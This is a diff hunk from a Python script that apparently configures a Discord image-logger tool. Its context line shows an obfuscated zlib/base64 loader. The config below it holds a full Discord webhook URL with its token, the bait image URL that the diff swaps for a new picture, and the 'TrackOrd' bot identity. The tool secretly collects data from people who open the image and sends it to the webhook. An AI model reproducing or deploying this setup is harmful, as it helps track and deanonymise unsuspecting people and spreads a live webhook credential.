@@ -5,7 +5,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1452542396805152889/Ox5vrfFTn7F_kB0RpgBsJ464620MSdK_Iv_7EOTOoEFCRB16NZHNI-vfMOjbQF7ZSXov",
-    "image": "https://imgs.search.brave.com/USr1EK14-gazyuH-X5Fj1aJz9b0RhFhBnFYH8MmlNyk/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4u/c3RvY2tzbmFwLmlv/L2ltZy10aHVtYnMv/MjgwaC9kb2ctYW5p/bWFsX0kzS09HTUtR/WkMuanBn",
+    "image": "https://imgs.search.brave.com/r0V3coPXof6GoWfcG9qyv2DOgaOaC1r6CCzx6M3OX9I/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMwLnNyY2RuLmNv/bS93b3JkcHJlc3Mv/d3AtY29udGVudC91/cGxvYWRzLzIwMTcv/MDMvS2luZy1Lb25n/LUVzY2FwZXMuanBn/P3E9NTAmZml0PWNy/b3Amdz04MjUmZHBy/PTEuNQ",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
